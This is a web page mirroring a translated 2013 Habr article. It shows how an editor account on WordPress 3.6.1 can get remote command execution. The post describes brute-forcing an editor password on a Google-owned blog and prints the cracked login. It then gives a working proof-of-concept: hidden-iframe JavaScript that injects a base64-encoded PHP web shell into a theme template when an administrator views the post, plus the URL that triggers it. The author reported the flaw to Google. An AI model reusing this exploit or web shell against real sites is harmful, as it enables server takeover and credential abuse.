<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>WordPress: unsafe out of the box - we get RCE with editor rights. And more about Google, a startup and 1 billion dollars</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Everyone enjoy reading. I want to talk about an insecure feature in the world-famous blog engine - WordPress, which has been present in it for a long ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>WordPress: unsafe out of the box - we get RCE with editor rights. And more about Google, a startup and 1 billion dollars</h1><div class="post__text post__text-html js-mediator-article">  Everyone enjoy reading.  I want to talk about an insecure feature in the world-famous blog engine - WordPress, which has been present in it for a long time.  Many people know about it (including this opportunity is recognized as ‚Äúlegitimate‚Äù by the developers themselves), but I‚Äôm not sure if someone described its use exactly in the article we offer in the attack vector (I personally could not find it). <br><br>  Many companies such as Microsoft, Nokia, <i>Google</i> use WordPress.  The administrators of blogs issue the rights of editors to their PR services ... And here is the main point - in WordPress only two roles have the right to use javascript inside posts - administrators and editors. <br><br>  <b>The whole idea in one sentence:</b> create a post containing malicious JS.  If the administrator opens our post - we get Remote Command Execution. <br><a name="habracut"></a><br>  A few days ago I had time and desire to dig some Google site.  The startup was taken for the purpose - waze.com, bought by Google for $ 1 billion.  Immediately WordPress was found, and I decided to sort out users' passwords on a rather small base - <a href="https://raw.github.com/danielmiessler/SecLists/master/Passwords/rockyou-75.txt">rockyou-75.txt</a> .  On waking in the morning I saw the coveted: <br><pre>
 [+] Starting the password brute forcer

   [SUCCESS] Login: di-ann Password: illuminati


   + ---- + -------- + ------ + ------------ +
   |  Id |  Login |  Name |  Password |
   + ---- + -------- + ------ + ------------ +
   |  |  di-ann |  |  illuminati |
   + ---- + -------- + ------ + ------------ +

 [+] Finished at Sat Sep 7 09:47:27 2013
 [+] Elapsed time: 00:42:52
 Exiting!
</pre>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Bingo!  Found a password from the user, with the rights of the editor.  Of course, I immediately wanted to get RCE on the server.  But ... known methods say that you need to have the rights of the administrator of the blog.  Then the shell can be poured through: <br><br><ul><li>  Editing topics and implementing your PHP code; </li><li>  Filling your module with malicious code. </li></ul><br>  We can do the same actions through js.  Create a post under the editor, in which we open the hidden iframe, and perform the necessary actions in it.  If the post opens admin - we get RCE. <br><br>  PoC exploit: <br><pre><code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'evilframe'</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'/wordpress/wp-admin/theme-editor.php?file=404.php&amp;theme=twentythirteen'</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">style</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'display:none'</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">onload</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"if (evilframe.document.getElementById('newcontent').value.indexOf('system') == -1) {evilframe.document.getElementById('newcontent').value += atob('PD9waHAgQHN5c3RlbSgkX0dFVFsnY21kJ10pOyA/Pg=='); evilframe.document.getElementById('submit').click();}"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><br>  Line by line: <br><pre> <code class="hljs pgsql">iframe <span class="hljs-type"><span class="hljs-type">name</span></span>=<span class="hljs-string"><span class="hljs-string">'evilframe'</span></span> src=<span class="hljs-string"><span class="hljs-string">'/wordpress/wp-admin/theme-editor.php?file=404.php&amp;theme=twentythirteen'</span></span> //  iframe     <span class="hljs-number"><span class="hljs-number">404</span></span>   (twentythirteen) style=<span class="hljs-string"><span class="hljs-string">'display:none'</span></span> //  iframe  onload= //    <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (evilframe.document.getElementById(<span class="hljs-string"><span class="hljs-string">'newcontent'</span></span>).<span class="hljs-keyword"><span class="hljs-keyword">value</span></span>.indexOf(<span class="hljs-string"><span class="hljs-string">'system'</span></span>) == <span class="hljs-number"><span class="hljs-number">-1</span></span>) // ,       backdoor (  <span class="hljs-keyword"><span class="hljs-keyword">system</span></span>) evilframe.document.getElementById(<span class="hljs-string"><span class="hljs-string">'newcontent'</span></span>).<span class="hljs-keyword"><span class="hljs-keyword">value</span></span> += atob(<span class="hljs-string"><span class="hljs-string">'PD9waHAgQHN5c3RlbSgkX0dFVFsnY21kJ10pOyA/Pg=='</span></span>//       &lt;?php @<span class="hljs-keyword"><span class="hljs-keyword">system</span></span>($_GET[<span class="hljs-string"><span class="hljs-string">'cmd'</span></span>]); ?&gt; evilframe.document.getElementById(<span class="hljs-string"><span class="hljs-string">'submit'</span></span>).click() //  </code> </pre><br><br>  We can also perform any actions under the administrator, for example: <br><ul><li>  Create a new user with administrator rights; </li><li>  Change the admin password (because WordPress does not require the old password when changing it); </li><li>  Change the password to any user; </li><li>  And any other actions available only to the admin. </li></ul><br><br>  So, using the PoC code above, we will inject the backdoor into the twentythirteen theme template on page 404, as soon as any authorized admin opens our post.  This applies to  latest WordPress version - 3.6.1 <br><br>  After the introduction of the back-end, RCE will be available on the following request: <br><br><pre>  http: // localhost / wordpress /? p = 123123123 &amp; cmd = id </pre><br><br>  In the case of Google, I did not embed the code above, but simply recorded the video, how can I get RCE.  They immediately removed WordPress and moved to blogger.com.  Correct solution.  I also found other bugs, but did not receive the money, as the resource is in the blackout period (6 months after purchase).  But added to the <a href="http://www.google.com/about/appsecurity/hall-of-fame/distinction/">hall of fame</a> :-) <br><br>  Demo (which was sent to Google): <br><iframe width="560" height="315" src="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://www.youtube.com/embed/OncH442mnMk%3Ffeature%3Doembed&amp;xid=17259,1500001,15700023,15700043,15700186,15700191,15700253&amp;usg=ALkJrhhhtBRIfi12D2H-D6Lnql3_R67f8w" frameborder="0" allowfullscreen=""></iframe></div><p>Source: <a href="https://habr.com/ru/post/194282/">https://habr.com/ru/post/194282/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../194270/index.html">Geography Habra or "where are you, Habrovets"</a></li>
<li><a href="../194274/index.html">FQ_CoDel - package scheduler that does everything for you</a></li>
<li><a href="../194276/index.html">YaC: Why it's important not to miss the main technology conference of Yandex in 2013</a></li>
<li><a href="../194278/index.html">Runetology (208): Dmitry Mendrelyuk, founder of the Computerra publishing house</a></li>
<li><a href="../194280/index.html">Create UserVoice and StackExchange in phpBB</a></li>
<li><a href="../194284/index.html">Feed the rabbit and work with Admob Mediation</a></li>
<li><a href="../194286/index.html">Arcade Volleyball on HTML5 and Android</a></li>
<li><a href="../194290/index.html">Routing workflows by employee roles in Worklite Docs for MS Sharepoint 2013 Electronic Document Management</a></li>
<li><a href="../194294/index.html">Interactive map of hostilities around copyright</a></li>
<li><a href="../194296/index.html">Three years later, an auto-pilot will appear on Tesla X electric cars.</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>